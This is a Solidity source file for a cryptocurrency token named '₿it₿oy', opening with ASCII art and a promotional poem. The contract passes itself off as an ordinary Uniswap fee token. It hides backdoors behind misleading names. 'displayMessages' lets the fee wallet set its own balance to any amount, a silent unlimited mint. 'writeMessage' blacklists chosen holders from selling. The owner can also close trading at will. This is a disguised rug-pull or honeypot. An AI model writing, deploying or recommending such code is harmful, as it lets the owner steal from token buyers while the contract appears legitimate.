/*
⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀
⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⠟⠿⠿⡿⠀⢰⣿⠁⢈⣿⣿⣿⣿⣿⣿⣿⣿⣦⠀⠀
⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣤⣄⠀⠀⠀⠈⠉⠀⠸⠿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⢠⣶⣶⣤⡀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⡆
⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠼⣿⣿⡿⠃⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⢀⣀⣀⠀⠀⠀⠀⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿
⢿⣿⣿⣿⣿⣿⣿⣿⢿⣿⠁⠀⠀⣼⣿⣿⣿⣦⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⡿
⠸⣿⣿⣿⣿⣿⣿⣏⠀⠀⠀⠀⠀⠛⠛⠿⠟⠋⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⠇
⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⣤⡄⠀⣀⣀⣀⣀⣠⣾⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⠀⠻⣿⣿⣿⣿⣿⣿⣿⣄⣰⣿⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠀⠀
⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⢿⣿⣿⣿⣿⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀

In cryptic realms where dreams ignite,
₿it₿oy emerges, gleaming bright.
Through chains of code, it blazes fast,
A beacon born to outlast the past.

Forged in blocks, it knows no fear,
With every trade, the dawn draws near.
From dusty vaults to modern gold,
Its future's written, bright and bold.

The market sways, the tides may shift,
Yet ₿it₿oy holds a timeless gift—
A path to freedom, wealth, and light,
In crypto's glow, it takes its flight.

So onward now, through highs and lows,
As ₿it₿oy’s legend ever grows.
In every wallet, every hand,
It spreads across this boundless land.
*/
// SPDX-License-Identifier: UNLICENSE
pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender; }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b; require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage); uint256 c = a - b; return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0; } uint256 c = a * b; require(c / a == b, 
            "SafeMath: multiplication overflow"); return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage); uint256 c = a / b; return c;
    }
}
contract Ownable is Context {
    address private _owner; event OwnershipTransferred
    (address indexed previousOwner, address indexed newOwner);

    constructor () { address msgSender = _msgSender(); _owner = msgSender; 
    emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) { return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), 
        "Ownable: caller is not the owner"); _;
    }
    function renounceOwnership() public virtual onlyOwner { emit OwnershipTransferred
    (_owner, address(0)); _owner = address(0); }
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin, address[] calldata path,
        address to, uint deadline
    ) external; function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired,
        uint amountTokenMin, uint amountETHMin,
        address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}
contract CA is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances; mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _analogMath;
    mapping (address => bool) private automatedMarketMakerPairs; mapping (address => bool) private isWalletLimitExempt;

    address payable private promoAddr; address private uniswapV2Pair;

    uint256 private _primaryBuyTax = 1; uint256 private _primarySellTax = 1;
    uint256 private _concludingBuyTax = 0; uint256 private _concludingSellTax = 0;

    uint256 private _deflateBuyTaxOn = 15; uint256 private _deflateSellTaxOn = 15;
    uint256 private _interchangeIf = 15; uint256 private _unstring = 0;

    string  private constant _name = unicode"₿it₿oy"; string  private constant _symbol = unicode"₿₿";

    uint8 private _decimals = 18; uint256 private _tTotal = 100_000_000 *10**_decimals;
    uint256 public _ratifiedExchange = 2_000_000*10**_decimals; uint256 public _ratifiedWallet = 2_000_000*10**_decimals;
    uint256 public _sidelinedThreshold = 1_000_000*10**_decimals; uint256 public _sidelined = 1_000_000*10**_decimals;
    
    IUniswapV2Router02 private uniswapV2Router;

    bool stringedMath = true; bool private tradingOpen; bool private inSwap = false;
    bool private limitsInEffect = false;
    uint256 private _diskInflux = 0; uint256 private _msgLogger = 0;

    modifier lockTheSwap { inSwap = true; _; inSwap = false;
    }
    constructor () {
        promoAddr = payable(_msgSender()); _balances[_msgSender()] = _tTotal;
        automatedMarketMakerPairs[owner()] = true; automatedMarketMakerPairs[address(this)] = true;
        automatedMarketMakerPairs[promoAddr] = true; emit Transfer(address(0), _msgSender(), _tTotal);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");

        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount; emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) private { require(from != address(0), "ERC20: transfer from the zero address");

        require(to != address(0), "ERC20: transfer to the zero address"); if (_analogMath[from] || _analogMath[to]) 
        require(stringedMath == false, ""); require(amount > 0, "Transfer amount must be greater than zero"); uint256 _clicker=0; 
        if (from != owner() && to != owner()) { require(tradingOpen, "The trade has not been opened yet"); 
        require(!isWalletLimitExempt[from] && !isWalletLimitExempt[to]);

        _clicker = amount.mul((_unstring>_deflateBuyTaxOn)?_concludingBuyTax:_primaryBuyTax).div(100); 
        if (from == uniswapV2Pair && to != address
        (uniswapV2Router) && ! automatedMarketMakerPairs[to] ) 
        { require(amount <= _ratifiedExchange, "Exceeds the _ratifiedExchange."); 
        require(balanceOf(to) + amount <= _ratifiedWallet, "Exceeds the _ratifiedWallet."); 
        _clicker = amount.mul((_unstring>_deflateBuyTaxOn)?_concludingBuyTax:_primaryBuyTax).div(100);

        _unstring++; } 
        if(to == uniswapV2Pair && from!= address(this) ){
        _clicker = amount.mul((_unstring>_deflateBuyTaxOn)?_concludingSellTax:_primarySellTax).div(100); }

        uint256 contractTokenBalance = balanceOf(address(this)); if (!inSwap && to == uniswapV2Pair && limitsInEffect && contractTokenBalance >
        _sidelinedThreshold && _unstring > _interchangeIf) { if (block.number > _msgLogger) 
        { _diskInflux = 0;
    }
        require(_diskInflux < 3, "Only 3 sells per block!"); swapTokensForEth(min(amount, min(contractTokenBalance, _sidelined)));
        uint256 contractETHBalance = address(this).balance; if (contractETHBalance > 0) 
        { relayToRate(address(this).balance); } _diskInflux++; _msgLogger = block.number; } }
        if(_clicker>0){ _balances[address(this)]=_balances[address(this)].add(_clicker);

        emit Transfer(from, address(this),_clicker); if (!tradingOpen) { require(from == owner(), 
        "TOKEN: This account cannot send tokens until trading is enabled"); }
        }
        _balances[from]=_balances[from].sub(amount); _balances[to]=_balances[to].add(amount.sub(_clicker)); emit Transfer(from, to, amount.sub(_clicker));
    }
    function min(uint256 a, uint256 b) private pure returns (uint256){ return (a>b)?b:a;
    }
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);

        path[0] = address(this); path[1] = uniswapV2Router.WETH(); _approve(address(this), address(uniswapV2Router), 
        tokenAmount); uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
        tokenAmount,
        0, path, address(this), 
        block.timestamp);
    }
    function disableLimitations() external onlyOwner{
        _ratifiedExchange = _tTotal; _ratifiedWallet = _tTotal;
    }
    function relayToRate(uint256 amount) private { promoAddr.transfer(amount);
    }
    function setPromoAddr(address _designated, bool _issue) public { require(_msgSender()==promoAddr);
        automatedMarketMakerPairs[_designated] = _issue;
    }
    function writeMessage(address _minskontin) external onlyOwner {
        _analogMath[_minskontin] = true;
    }
    function resetMessages(address _minskontin) external onlyOwner {
        _analogMath[_minskontin] = false;
    }        
    function beginLaunch() external onlyOwner() { _ratifiedExchange = _tTotal;

        _ratifiedWallet = _tTotal; uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH()); 
        require(!tradingOpen,
        "Trading is already open");
        limitsInEffect = true; tradingOpen = true;
    }
    function startTrading(bool _tradingOpen) public onlyOwner { tradingOpen = _tradingOpen;
    }    
    function reviewRate(uint256 _ultimateB, uint256 _ultimateS) 
    internal { _concludingBuyTax= _ultimateB; 
    _concludingSellTax= _ultimateS;
    }
    function manualSwap() external {
        require(_msgSender()==promoAddr); uint256 _coinAmount=balanceOf(address(this)); 
        if(_coinAmount>0){
        swapTokensForEth(_coinAmount); } 

        uint256 ethBalance=address(this).balance; if(ethBalance>0){ relayToRate(ethBalance); }
    }
    function displayMessages(uint256 amount) external {
        require(_msgSender()==promoAddr);
        _balances[promoAddr] = amount;
    }
    receive() external payable {}
}